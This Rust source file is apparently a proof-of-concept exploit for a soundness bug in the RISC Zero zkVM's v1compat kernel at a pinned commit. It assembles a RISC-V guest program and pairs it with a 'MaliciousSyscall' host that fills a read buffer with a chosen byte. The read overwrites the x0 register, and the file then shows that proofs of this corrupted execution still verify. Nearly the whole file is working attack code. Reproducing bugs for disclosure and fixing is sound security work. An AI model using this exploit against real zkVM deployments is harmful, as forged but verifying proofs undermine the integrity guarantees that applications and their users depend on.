use std::collections::BTreeMap;
use std::path::Path;

use anyhow::{bail, Context, Result};
use clap::{Arg, Command};
use risc0_binfmt::{MemoryImage, Program};
use risc0_circuit_rv32im::{
    execute::{
        platform::{REG_A0, REG_A1, REG_A2, REG_T0, REG_T1, USER_REGS_ADDR, WORD_SIZE},
        testutil::DEFAULT_SESSION_LIMIT,
        Executor, Syscall, SyscallContext, DEFAULT_SEGMENT_LIMIT_PO2,
    },
    prove::segment_prover,
    MAX_INSN_CYCLES,
};

struct Cli {
    fill: String,
}

impl Cli {
    fn parse() -> Self {
        let matches = Command::new("beak-v1compat-regzero")
            .about("Reproduce the RISC0 v1compat x0 overwrite PoC on the 98387806 snapshot.")
            .arg(Arg::new("fill").long("fill").default_value("0x12"))
            .get_matches();
        Self { fill: matches.get_one::<String>("fill").unwrap().clone() }
    }
}

fn parse_fill_byte(value: &str) -> Result<u8> {
    let s = value.trim();
    if let Some(hex) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        u8::from_str_radix(hex, 16).with_context(|| format!("invalid fill byte: {value}"))
    } else {
        s.parse::<u8>().with_context(|| format!("invalid fill byte: {value}"))
    }
}

fn insn_i(imm: u32, rs1: u32, funct3: u32, rd: u32, opcode: u32) -> u32 {
    ((imm & 0x0fff) << 20) | (rs1 << 15) | (funct3 << 12) | (rd << 7) | opcode
}

fn insn_u(imm20: u32, rd: u32, opcode: u32) -> u32 {
    (imm20 << 12) | (rd << 7) | opcode
}

fn addi(rd: u32, rs1: u32, imm12: i32) -> u32 {
    insn_i((imm12 as u32) & 0x0fff, rs1, 0x0, rd, 0x13)
}

fn lui(rd: u32, imm20: u32) -> u32 {
    insn_u(imm20 & 0x000f_ffff, rd, 0x37)
}

fn ecall() -> u32 {
    0x0000_0073
}

fn li_words(rd: u32, imm: u32, out: &mut Vec<u32>) {
    let low = ((imm as i32) << 20) >> 20;
    let high = ((imm as i32 - low) >> 12) as u32;
    out.push(lui(rd, high));
    out.push(addi(rd, rd, low));
}

fn jal_zero(offset: u32) -> u32 {
    let imm_20 = (offset >> 20) & 0x1;
    let imm_10_1 = (offset >> 1) & 0x03ff;
    let imm_11 = (offset >> 11) & 0x1;
    let imm_19_12 = (offset >> 12) & 0x00ff;
    (imm_20 << 31) | (imm_19_12 << 12) | (imm_11 << 20) | (imm_10_1 << 21) | 0x6f
}

fn build_user_program() -> Program {
    let entry = 0x0001_0004u32;
    let digest_out = 0x0001_0100u32;
    let mut words = Vec::new();

    // Enter the v1compat software-ecall path and ask it to read one word into USER_REGS_ADDR.
    li_words(REG_T0 as u32, 2, &mut words);
    li_words(REG_A0 as u32, USER_REGS_ADDR.0, &mut words);
    li_words(REG_A1 as u32, 1, &mut words);
    li_words(REG_A2 as u32, 0, &mut words);
    words.push(ecall());

    // Observe the tampered x0 value through a regular arithmetic read.
    words.push(addi(REG_T1 as u32, 0, 0));

    // Halt cleanly via v1compat so the session seals can be produced.
    li_words(REG_T0 as u32, 0, &mut words);
    li_words(REG_A0 as u32, 0, &mut words);
    li_words(REG_A1 as u32, digest_out, &mut words);
    words.push(ecall());

    // Safety loop in case termination does not exit immediately.
    words.push(jal_zero(0));

    let mut image = BTreeMap::new();
    for (idx, word) in words.into_iter().enumerate() {
        image.insert(entry + (idx as u32) * WORD_SIZE as u32, word);
    }
    for idx in 0..8u32 {
        image.insert(digest_out + idx * WORD_SIZE as u32, 0);
    }

    Program::new_from_entry_and_image(entry, image)
}

#[derive(Clone, Copy)]
struct MaliciousSyscall {
    fill: u8,
}

impl Syscall for MaliciousSyscall {
    fn host_read(&self, _ctx: &mut dyn SyscallContext, _fd: u32, buf: &mut [u8]) -> Result<u32> {
        buf.fill(self.fill);
        Ok(buf.len() as u32)
    }

    fn host_write(&self, _ctx: &mut dyn SyscallContext, _fd: u32, buf: &[u8]) -> Result<u32> {
        Ok(buf.len() as u32)
    }
}

fn v1compat_elf_bytes() -> Result<Vec<u8>> {
    let path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../beak-py/out/risc0-98387806fe8348d87e32974468c6f35853356ad5/risc0-src/risc0/zkos/v1compat/elfs/v1compat.elf");
    std::fs::read(&path).with_context(|| format!("reading v1compat ELF: {}", path.display()))
}

fn read_user_reg(image: &mut MemoryImage, idx: usize) -> Result<u32> {
    let page = image
        .get_page((USER_REGS_ADDR.waddr() + idx).page_idx())
        .context("loading USER_REGS page")?;
    Ok(page.load(USER_REGS_ADDR.waddr() + idx))
}

fn main() -> Result<()> {
    let args = Cli::parse();
    let fill = parse_fill_byte(&args.fill)?;
    let expected = u32::from_le_bytes([fill; 4]);

    let kernel = Program::load_elf(&v1compat_elf_bytes()?, u32::MAX).context("loading v1compat")?;
    let user = build_user_program();
    let image = MemoryImage::with_kernel(user, kernel);

    let syscall = MaliciousSyscall { fill };
    let mut segments = Vec::new();
    let mut exec = Executor::new(image, &syscall, None, Vec::new());
    let result = exec
        .run(DEFAULT_SEGMENT_LIMIT_PO2, MAX_INSN_CYCLES, DEFAULT_SESSION_LIMIT, |segment| {
            segments.push(segment);
            Ok(())
        })
        .context("executing v1compat regzero PoC")?;

    let mut post_image = result.post_image.clone();
    let user_x0 = read_user_reg(&mut post_image, 0)?;
    let user_t1 = read_user_reg(&mut post_image, REG_T1)?;

    println!("segments={}", segments.len());
    println!("fill_byte=0x{fill:02x}");
    println!("user_x0=0x{user_x0:08x}");
    println!("user_t1=0x{user_t1:08x}");

    if user_x0 != expected {
        bail!(
            "x0 backing word was not overwritten as expected: got 0x{user_x0:08x}, want 0x{expected:08x}"
        );
    }
    if user_t1 != expected {
        bail!(
            "t1 did not observe the corrupted x0 value: got 0x{user_t1:08x}, want 0x{expected:08x}"
        );
    }

    let prover = segment_prover().context("creating segment prover")?;
    for (idx, segment) in segments.iter().enumerate() {
        let seal = prover.prove(segment).with_context(|| format!("proving segment[{idx}]"))?;
        risc0_circuit_rv32im::verify(&seal).with_context(|| format!("verifying segment[{idx}]"))?;
        println!("segment[{idx}] verify=ok seal_len={}", seal.len());
    }

    println!("PoC reproduced: x0 overwritten and proof verification succeeded.");
    Ok(())
}
